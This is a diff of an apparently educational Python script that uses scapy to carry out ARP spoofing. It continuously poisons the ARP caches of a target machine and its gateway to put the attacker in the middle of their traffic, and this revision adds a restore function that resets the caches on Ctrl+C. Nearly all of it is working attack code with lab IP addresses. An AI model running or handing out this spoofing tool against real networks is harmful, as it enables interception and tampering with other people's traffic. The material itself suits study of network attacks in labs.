@@ -27,27 +27,50 @@ def spoof(target_ip, spoof_ip):
     # then check the target machine again with arp -a (the router's 1p is acossiated with attacker's mac)
     # check the attackers mac with ifconfig eth0
 
+# restore arp tables of the router and the target back to normal
+# it will take the ip of the target and the ip of the router
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    # examine the packet to confirm the flow
+    # print(packet.show())
+    # print(packet.summary())
+    # send the packet for times just in case ...
+    scapy.send(packet, count=4, verbose=False)
 
-# be in the middle of the connection and send continiously packets and sleep two secs
+
+target_ip = "192.168.22.4"
+gateway_ip = "192.168.22.1"
+
+# Be in the middle of the connection and send continiously packets and sleep two secs
 # to maintain spoofing. otherwise it will send one packet only and mac address will change
 # to original
 count = 0
-while True:
-    spoof("192.168.22.4", "192.168.22.1")
-    spoof("192.168.22.1", "192.168.22.4")
-    # counter
-    count = count + 2
-    # print("[+] Sent {} Packets".format(count))
-    # or
-    # print(f'[+] Sent {count} packets')
-    # or
-    # overwrite line with \r and put a comma in the end of print statement for dynamic printing
-    # print("\r [+] Packets Sent: " + str(count)),
-    # optimized for python3 for dynamic printing
-    print("\r [+] Packets Sent: " + str(count), end="")
-    # flush everything out of the buffer
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        # counter
+        count = count + 2
+        # print("[+] Sent {} Packets".format(count))
+        # or
+        # print(f'[+] Sent {count} packets')
+        # or
+        # overwrite line with \r and put a comma in the end of print statement for dynamic printing
+        # print("\r [+] Packets Sent: " + str(count)),
+        # optimized for python3 for dynamic printing
+        print("\r [+] Packets Sent: " + str(count), end="")
+        # flush everything out of the buffer
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ... Resetting ARP tables.... Please Wait.\n")
+    # reset the dest machine with the correct mac values of the router machine
+    restore(target_ip, gateway_ip)
+    # reset the router machine with the correct mac values of the dest machine
+    restore(gateway_ip, target_ip)
+
 
 
 # don't forget to allow traffic through the attacker in order to be the middle man
